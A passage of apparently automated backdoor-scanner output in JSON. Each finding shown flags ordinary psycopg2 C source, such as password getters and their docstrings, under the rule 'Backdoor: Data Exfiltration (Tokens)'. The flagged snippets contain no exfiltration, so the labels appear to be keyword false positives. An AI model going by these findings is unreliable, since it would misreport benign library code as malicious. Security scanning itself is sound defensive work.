                    "rendered": {
                      "text": "        (char *)error_message_doc },\n    { \"socket\", (getter)socket_get, NULL, (char *)socket_doc },\n    { \"backend_pid\", (getter)backend_pid_get, NULL, (char *)backend_pid_doc },\n    { \"used_password\", (getter)used_password_get, NULL,\n        (char *)used_password_doc },\n    { \"needs_password\", (getter)needs_password_get, NULL,\n        (char *)needs_password_doc },\n",
                      "markdown": "`        (char *)error_message_doc },\n    { \"socket\", (getter)socket_get, NULL, (char *)socket_doc },\n    { \"backend_pid\", (getter)backend_pid_get, NULL, (char *)backend_pid_doc },\n    { \"used_password\", (getter)used_password_get, NULL,\n        (char *)used_password_doc },\n    { \"needs_password\", (getter)needs_password_get, NULL,\n        (char *)needs_password_doc },\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 554,
                  "startColumn": 12,
                  "endLine": 554,
                  "endColumn": 20,
                  "snippet": {
                    "text": "        (char *)error_message_doc },\n    { \"socket\", (getter)socket_get, NULL, (char *)socket_doc },\n    { \"backend_pid\", (getter)backend_pid_get, NULL, (char *)backend_pid_doc },\n    { \"used_password\", (getter)used_password_get, NULL,\n        (char *)used_password_doc },\n    { \"needs_password\", (getter)needs_password_get, NULL,\n        (char *)needs_password_doc },\n",
                    "rendered": {
                      "text": "        (char *)error_message_doc },\n    { \"socket\", (getter)socket_get, NULL, (char *)socket_doc },\n    { \"backend_pid\", (getter)backend_pid_get, NULL, (char *)backend_pid_doc },\n    { \"used_password\", (getter)used_password_get, NULL,\n        (char *)used_password_doc },\n    { \"needs_password\", (getter)needs_password_get, NULL,\n        (char *)needs_password_doc },\n",
                      "markdown": "`        (char *)error_message_doc },\n    { \"socket\", (getter)socket_get, NULL, (char *)socket_doc },\n    { \"backend_pid\", (getter)backend_pid_get, NULL, (char *)backend_pid_doc },\n    { \"used_password\", (getter)used_password_get, NULL,\n        (char *)used_password_doc },\n    { \"needs_password\", (getter)needs_password_get, NULL,\n        (char *)needs_password_doc },\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 537,
                  "startColumn": 54,
                  "endLine": 537,
                  "endColumn": 62,
                  "snippet": {
                    "text": "static struct PyGetSetDef connInfoObject_getsets[] = {\n    { \"dbname\", (getter)dbname_get, NULL, (char *)dbname_doc },\n    { \"user\", (getter)user_get, NULL, (char *)user_doc },\n    { \"password\", (getter)password_get, NULL, (char *)password_doc },\n    { \"host\", (getter)host_get, NULL, (char *)host_doc },\n    { \"port\", (getter)port_get, NULL, (char *)port_doc },\n    { \"options\", (getter)options_get, NULL, (char *)options_doc },\n",
                    "rendered": {
                      "text": "static struct PyGetSetDef connInfoObject_getsets[] = {\n    { \"dbname\", (getter)dbname_get, NULL, (char *)dbname_doc },\n    { \"user\", (getter)user_get, NULL, (char *)user_doc },\n    { \"password\", (getter)password_get, NULL, (char *)password_doc },\n    { \"host\", (getter)host_get, NULL, (char *)host_doc },\n    { \"port\", (getter)port_get, NULL, (char *)port_doc },\n    { \"options\", (getter)options_get, NULL, (char *)options_doc },\n",
                      "markdown": "`static struct PyGetSetDef connInfoObject_getsets[] = {\n    { \"dbname\", (getter)dbname_get, NULL, (char *)dbname_doc },\n    { \"user\", (getter)user_get, NULL, (char *)user_doc },\n    { \"password\", (getter)password_get, NULL, (char *)password_doc },\n    { \"host\", (getter)host_get, NULL, (char *)host_doc },\n    { \"port\", (getter)port_get, NULL, (char *)port_doc },\n    { \"options\", (getter)options_get, NULL, (char *)options_doc },\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 537,
                  "startColumn": 26,
                  "endLine": 537,
                  "endColumn": 34,
                  "snippet": {
                    "text": "static struct PyGetSetDef connInfoObject_getsets[] = {\n    { \"dbname\", (getter)dbname_get, NULL, (char *)dbname_doc },\n    { \"user\", (getter)user_get, NULL, (char *)user_doc },\n    { \"password\", (getter)password_get, NULL, (char *)password_doc },\n    { \"host\", (getter)host_get, NULL, (char *)host_doc },\n    { \"port\", (getter)port_get, NULL, (char *)port_doc },\n    { \"options\", (getter)options_get, NULL, (char *)options_doc },\n",
                    "rendered": {
                      "text": "static struct PyGetSetDef connInfoObject_getsets[] = {\n    { \"dbname\", (getter)dbname_get, NULL, (char *)dbname_doc },\n    { \"user\", (getter)user_get, NULL, (char *)user_doc },\n    { \"password\", (getter)password_get, NULL, (char *)password_doc },\n    { \"host\", (getter)host_get, NULL, (char *)host_doc },\n    { \"port\", (getter)port_get, NULL, (char *)port_doc },\n    { \"options\", (getter)options_get, NULL, (char *)options_doc },\n",
                      "markdown": "`static struct PyGetSetDef connInfoObject_getsets[] = {\n    { \"dbname\", (getter)dbname_get, NULL, (char *)dbname_doc },\n    { \"user\", (getter)user_get, NULL, (char *)user_doc },\n    { \"password\", (getter)password_get, NULL, (char *)password_doc },\n    { \"host\", (getter)host_get, NULL, (char *)host_doc },\n    { \"port\", (getter)port_get, NULL, (char *)port_doc },\n    { \"options\", (getter)options_get, NULL, (char *)options_doc },\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 537,
                  "startColumn": 7,
                  "endLine": 537,
                  "endColumn": 15,
                  "snippet": {
                    "text": "static struct PyGetSetDef connInfoObject_getsets[] = {\n    { \"dbname\", (getter)dbname_get, NULL, (char *)dbname_doc },\n    { \"user\", (getter)user_get, NULL, (char *)user_doc },\n    { \"password\", (getter)password_get, NULL, (char *)password_doc },\n    { \"host\", (getter)host_get, NULL, (char *)host_doc },\n    { \"port\", (getter)port_get, NULL, (char *)port_doc },\n    { \"options\", (getter)options_get, NULL, (char *)options_doc },\n",
                    "rendered": {
                      "text": "static struct PyGetSetDef connInfoObject_getsets[] = {\n    { \"dbname\", (getter)dbname_get, NULL, (char *)dbname_doc },\n    { \"user\", (getter)user_get, NULL, (char *)user_doc },\n    { \"password\", (getter)password_get, NULL, (char *)password_doc },\n    { \"host\", (getter)host_get, NULL, (char *)host_doc },\n    { \"port\", (getter)port_get, NULL, (char *)port_doc },\n    { \"options\", (getter)options_get, NULL, (char *)options_doc },\n",
                      "markdown": "`static struct PyGetSetDef connInfoObject_getsets[] = {\n    { \"dbname\", (getter)dbname_get, NULL, (char *)dbname_doc },\n    { \"user\", (getter)user_get, NULL, (char *)user_doc },\n    { \"password\", (getter)password_get, NULL, (char *)password_doc },\n    { \"host\", (getter)host_get, NULL, (char *)host_doc },\n    { \"port\", (getter)port_get, NULL, (char *)port_doc },\n    { \"options\", (getter)options_get, NULL, (char *)options_doc },\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 412,
                  "startColumn": 43,
                  "endLine": 412,
                  "endColumn": 51,
                  "snippet": {
                    "text": "static PyObject *\nused_password_get(connInfoObject *self)\n{\n    return PyBool_FromLong(PQconnectionUsedPassword(self->conn->pgconn));\n}\n\n\n",
                    "rendered": {
                      "text": "static PyObject *\nused_password_get(connInfoObject *self)\n{\n    return PyBool_FromLong(PQconnectionUsedPassword(self->conn->pgconn));\n}\n\n\n",
                      "markdown": "`static PyObject *\nused_password_get(connInfoObject *self)\n{\n    return PyBool_FromLong(PQconnectionUsedPassword(self->conn->pgconn));\n}\n\n\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 410,
                  "startColumn": 5,
                  "endLine": 410,
                  "endColumn": 13,
                  "snippet": {
                    "text": "    \"#LIBPQ-PQCONNECTIONUSEDPASSWORD\";\n\nstatic PyObject *\nused_password_get(connInfoObject *self)\n{\n    return PyBool_FromLong(PQconnectionUsedPassword(self->conn->pgconn));\n}\n",
                    "rendered": {
                      "text": "    \"#LIBPQ-PQCONNECTIONUSEDPASSWORD\";\n\nstatic PyObject *\nused_password_get(connInfoObject *self)\n{\n    return PyBool_FromLong(PQconnectionUsedPassword(self->conn->pgconn));\n}\n",
                      "markdown": "`    \"#LIBPQ-PQCONNECTIONUSEDPASSWORD\";\n\nstatic PyObject *\nused_password_get(connInfoObject *self)\n{\n    return PyBool_FromLong(PQconnectionUsedPassword(self->conn->pgconn));\n}\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 407,
                  "startColumn": 28,
                  "endLine": 407,
                  "endColumn": 36,
                  "snippet": {
                    "text": "\"\\n\"\n\".. seealso:: libpq docs for `PQconnectionUsedPassword()`__ for details.\\n\"\n\".. __: https://www.postgresql.org/docs/current/static/libpq-status.html\"\n    \"#LIBPQ-PQCONNECTIONUSEDPASSWORD\";\n\nstatic PyObject *\nused_password_get(connInfoObject *self)\n",
                    "rendered": {
                      "text": "\"\\n\"\n\".. seealso:: libpq docs for `PQconnectionUsedPassword()`__ for details.\\n\"\n\".. __: https://www.postgresql.org/docs/current/static/libpq-status.html\"\n    \"#LIBPQ-PQCONNECTIONUSEDPASSWORD\";\n\nstatic PyObject *\nused_password_get(connInfoObject *self)\n",
                      "markdown": "`\"\\n\"\n\".. seealso:: libpq docs for `PQconnectionUsedPassword()`__ for details.\\n\"\n\".. __: https://www.postgresql.org/docs/current/static/libpq-status.html\"\n    \"#LIBPQ-PQCONNECTIONUSEDPASSWORD\";\n\nstatic PyObject *\nused_password_get(connInfoObject *self)\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 405,
                  "startColumn": 46,
                  "endLine": 405,
                  "endColumn": 54,
                  "snippet": {
                    "text": "\"\\n\"\n\":type: `!bool`\\n\"\n\"\\n\"\n\".. seealso:: libpq docs for `PQconnectionUsedPassword()`__ for details.\\n\"\n\".. __: https://www.postgresql.org/docs/current/static/libpq-status.html\"\n    \"#LIBPQ-PQCONNECTIONUSEDPASSWORD\";\n\n",
                    "rendered": {
                      "text": "\"\\n\"\n\":type: `!bool`\\n\"\n\"\\n\"\n\".. seealso:: libpq docs for `PQconnectionUsedPassword()`__ for details.\\n\"\n\".. __: https://www.postgresql.org/docs/current/static/libpq-status.html\"\n    \"#LIBPQ-PQCONNECTIONUSEDPASSWORD\";\n\n",
                      "markdown": "`\"\\n\"\n\":type: `!bool`\\n\"\n\"\\n\"\n\".. seealso:: libpq docs for `PQconnectionUsedPassword()`__ for details.\\n\"\n\".. __: https://www.postgresql.org/docs/current/static/libpq-status.html\"\n    \"#LIBPQ-PQCONNECTIONUSEDPASSWORD\";\n\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 401,
                  "startColumn": 45,
                  "endLine": 401,
                  "endColumn": 53,
                  "snippet": {
                    "text": "\n\nstatic const char used_password_doc[] =\n\"The connection authentication method used a password.\\n\"\n\"\\n\"\n\":type: `!bool`\\n\"\n\"\\n\"\n",
                    "rendered": {
                      "text": "\n\nstatic const char used_password_doc[] =\n\"The connection authentication method used a password.\\n\"\n\"\\n\"\n\":type: `!bool`\\n\"\n\"\\n\"\n",
                      "markdown": "`\n\nstatic const char used_password_doc[] =\n\"The connection authentication method used a password.\\n\"\n\"\\n\"\n\":type: `!bool`\\n\"\n\"\\n\"\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 400,
                  "startColumn": 23,
                  "endLine": 400,
                  "endColumn": 31,
                  "snippet": {
                    "text": "}\n\n\nstatic const char used_password_doc[] =\n\"The connection authentication method used a password.\\n\"\n\"\\n\"\n\":type: `!bool`\\n\"\n",
                    "rendered": {
                      "text": "}\n\n\nstatic const char used_password_doc[] =\n\"The connection authentication method used a password.\\n\"\n\"\\n\"\n\":type: `!bool`\\n\"\n",
                      "markdown": "`}\n\n\nstatic const char used_password_doc[] =\n\"The connection authentication method used a password.\\n\"\n\"\\n\"\n\":type: `!bool`\\n\"\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 396,
                  "startColumn": 44,
                  "endLine": 396,
                  "endColumn": 52,
                  "snippet": {
                    "text": "static PyObject *\nneeds_password_get(connInfoObject *self)\n{\n    return PyBool_FromLong(PQconnectionNeedsPassword(self->conn->pgconn));\n}\n\n\n",
                    "rendered": {
                      "text": "static PyObject *\nneeds_password_get(connInfoObject *self)\n{\n    return PyBool_FromLong(PQconnectionNeedsPassword(self->conn->pgconn));\n}\n\n\n",
                      "markdown": "`static PyObject *\nneeds_password_get(connInfoObject *self)\n{\n    return PyBool_FromLong(PQconnectionNeedsPassword(self->conn->pgconn));\n}\n\n\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 394,
                  "startColumn": 6,
                  "endLine": 394,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    \"#LIBPQ-PQCONNECTIONNEEDSPASSWORD\";\n\nstatic PyObject *\nneeds_password_get(connInfoObject *self)\n{\n    return PyBool_FromLong(PQconnectionNeedsPassword(self->conn->pgconn));\n}\n",
                    "rendered": {
                      "text": "    \"#LIBPQ-PQCONNECTIONNEEDSPASSWORD\";\n\nstatic PyObject *\nneeds_password_get(connInfoObject *self)\n{\n    return PyBool_FromLong(PQconnectionNeedsPassword(self->conn->pgconn));\n}\n",
                      "markdown": "`    \"#LIBPQ-PQCONNECTIONNEEDSPASSWORD\";\n\nstatic PyObject *\nneeds_password_get(connInfoObject *self)\n{\n    return PyBool_FromLong(PQconnectionNeedsPassword(self->conn->pgconn));\n}\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 391,
                  "startColumn": 29,
                  "endLine": 391,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\"\\n\"\n\".. seealso:: libpq docs for `PQconnectionNeedsPassword()`__ for details.\\n\"\n\".. __: https://www.postgresql.org/docs/current/static/libpq-status.html\"\n    \"#LIBPQ-PQCONNECTIONNEEDSPASSWORD\";\n\nstatic PyObject *\nneeds_password_get(connInfoObject *self)\n",
                    "rendered": {
                      "text": "\"\\n\"\n\".. seealso:: libpq docs for `PQconnectionNeedsPassword()`__ for details.\\n\"\n\".. __: https://www.postgresql.org/docs/current/static/libpq-status.html\"\n    \"#LIBPQ-PQCONNECTIONNEEDSPASSWORD\";\n\nstatic PyObject *\nneeds_password_get(connInfoObject *self)\n",
                      "markdown": "`\"\\n\"\n\".. seealso:: libpq docs for `PQconnectionNeedsPassword()`__ for details.\\n\"\n\".. __: https://www.postgresql.org/docs/current/static/libpq-status.html\"\n    \"#LIBPQ-PQCONNECTIONNEEDSPASSWORD\";\n\nstatic PyObject *\nneeds_password_get(connInfoObject *self)\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 389,
                  "startColumn": 47,
                  "endLine": 389,
                  "endColumn": 55,
                  "snippet": {
                    "text": "\"\\n\"\n\":type: `!bool`\\n\"\n\"\\n\"\n\".. seealso:: libpq docs for `PQconnectionNeedsPassword()`__ for details.\\n\"\n\".. __: https://www.postgresql.org/docs/current/static/libpq-status.html\"\n    \"#LIBPQ-PQCONNECTIONNEEDSPASSWORD\";\n\n",
                    "rendered": {
                      "text": "\"\\n\"\n\":type: `!bool`\\n\"\n\"\\n\"\n\".. seealso:: libpq docs for `PQconnectionNeedsPassword()`__ for details.\\n\"\n\".. __: https://www.postgresql.org/docs/current/static/libpq-status.html\"\n    \"#LIBPQ-PQCONNECTIONNEEDSPASSWORD\";\n\n",
                      "markdown": "`\"\\n\"\n\":type: `!bool`\\n\"\n\"\\n\"\n\".. seealso:: libpq docs for `PQconnectionNeedsPassword()`__ for details.\\n\"\n\".. __: https://www.postgresql.org/docs/current/static/libpq-status.html\"\n    \"#LIBPQ-PQCONNECTIONNEEDSPASSWORD\";\n\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 385,
                  "startColumn": 49,
                  "endLine": 385,
                  "endColumn": 57,
                  "snippet": {
                    "text": "\n\nstatic const char needs_password_doc[] =\n\"The connection authentication method required a password, but none was available.\\n\"\n\"\\n\"\n\":type: `!bool`\\n\"\n\"\\n\"\n",
                    "rendered": {
                      "text": "\n\nstatic const char needs_password_doc[] =\n\"The connection authentication method required a password, but none was available.\\n\"\n\"\\n\"\n\":type: `!bool`\\n\"\n\"\\n\"\n",
                      "markdown": "`\n\nstatic const char needs_password_doc[] =\n\"The connection authentication method required a password, but none was available.\\n\"\n\"\\n\"\n\":type: `!bool`\\n\"\n\"\\n\"\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 384,
                  "startColumn": 24,
                  "endLine": 384,
                  "endColumn": 32,
                  "snippet": {
                    "text": "}\n\n\nstatic const char needs_password_doc[] =\n\"The connection authentication method required a password, but none was available.\\n\"\n\"\\n\"\n\":type: `!bool`\\n\"\n",
                    "rendered": {
                      "text": "}\n\n\nstatic const char needs_password_doc[] =\n\"The connection authentication method required a password, but none was available.\\n\"\n\"\\n\"\n\":type: `!bool`\\n\"\n",
                      "markdown": "`}\n\n\nstatic const char needs_password_doc[] =\n\"The connection authentication method required a password, but none was available.\\n\"\n\"\\n\"\n\":type: `!bool`\\n\"\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 197,
                  "startColumn": 63,
                  "endLine": 197,
                  "endColumn": 71,
                  "snippet": {
                    "text": "        goto exit;\n    }\n\n    res = psyco_dict_from_conninfo_options(options, /* include_password = */ 0);\n\nexit:\n    PQconninfoFree(options);\n",
                    "rendered": {
                      "text": "        goto exit;\n    }\n\n    res = psyco_dict_from_conninfo_options(options, /* include_password = */ 0);\n\nexit:\n    PQconninfoFree(options);\n",
                      "markdown": "`        goto exit;\n    }\n\n    res = psyco_dict_from_conninfo_options(options, /* include_password = */ 0);\n\nexit:\n    PQconninfoFree(options);\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 177,
                  "startColumn": 6,
                  "endLine": 177,
                  "endColumn": 14,
                  "snippet": {
                    "text": "\"\\n\"\n\"The results include values which weren't explicitly set by the connection\\n\"\n\"string, such as defaults, environment variables, etc.\\n\"\n\"The *password* parameter is removed from the results.\\n\"\n\"\\n\"\n\".. seealso:: libpq docs for `PQconninfo()`__ for details.\\n\"\n\".. __: https://www.postgresql.org/docs/current/libpq-connect.html\"\n",
                    "rendered": {
                      "text": "\"\\n\"\n\"The results include values which weren't explicitly set by the connection\\n\"\n\"string, such as defaults, environment variables, etc.\\n\"\n\"The *password* parameter is removed from the results.\\n\"\n\"\\n\"\n\".. seealso:: libpq docs for `PQconninfo()`__ for details.\\n\"\n\".. __: https://www.postgresql.org/docs/current/libpq-connect.html\"\n",
                      "markdown": "`\"\\n\"\n\"The results include values which weren't explicitly set by the connection\\n\"\n\"string, such as defaults, environment variables, etc.\\n\"\n\"The *password* parameter is removed from the results.\\n\"\n\"\\n\"\n\".. seealso:: libpq docs for `PQconninfo()`__ for details.\\n\"\n\".. __: https://www.postgresql.org/docs/current/libpq-connect.html\"\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 92,
                  "endLine": 92,
                  "endColumn": 8,
                  "snippet": {
                    "text": "    \"#LIBPQ-PQPASS\";\n\nstatic PyObject *\npassword_get(connInfoObject *self)\n{\n    const char *val;\n\n",
                    "rendered": {
                      "text": "    \"#LIBPQ-PQPASS\";\n\nstatic PyObject *\npassword_get(connInfoObject *self)\n{\n    const char *val;\n\n",
                      "markdown": "`    \"#LIBPQ-PQPASS\";\n\nstatic PyObject *\npassword_get(connInfoObject *self)\n{\n    const char *val;\n\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 85,
                  "startColumn": 5,
                  "endLine": 85,
                  "endColumn": 13,
                  "snippet": {
                    "text": "\n\nstatic const char password_doc[] =\n\"The password of the connection.\\n\"\n\"\\n\"\n\".. seealso:: libpq docs for `PQpass()`__ for details.\\n\"\n\".. __: https://www.postgresql.org/docs/current/static/libpq-status.html\"\n",
                    "rendered": {
                      "text": "\n\nstatic const char password_doc[] =\n\"The password of the connection.\\n\"\n\"\\n\"\n\".. seealso:: libpq docs for `PQpass()`__ for details.\\n\"\n\".. __: https://www.postgresql.org/docs/current/static/libpq-status.html\"\n",
                      "markdown": "`\n\nstatic const char password_doc[] =\n\"The password of the connection.\\n\"\n\"\\n\"\n\".. seealso:: libpq docs for `PQpass()`__ for details.\\n\"\n\".. __: https://www.postgresql.org/docs/current/static/libpq-status.html\"\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/conninfo_type.c"
                },
                "region": {
                  "startLine": 84,
                  "startColumn": 18,
                  "endLine": 84,
                  "endColumn": 26,
                  "snippet": {
                    "text": "}\n\n\nstatic const char password_doc[] =\n\"The password of the connection.\\n\"\n\"\\n\"\n\".. seealso:: libpq docs for `PQpass()`__ for details.\\n\"\n",
                    "rendered": {
                      "text": "}\n\n\nstatic const char password_doc[] =\n\"The password of the connection.\\n\"\n\"\\n\"\n\".. seealso:: libpq docs for `PQpass()`__ for details.\\n\"\n",
                      "markdown": "`}\n\n\nstatic const char password_doc[] =\n\"The password of the connection.\\n\"\n\"\\n\"\n\".. seealso:: libpq docs for `PQpass()`__ for details.\\n\"\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
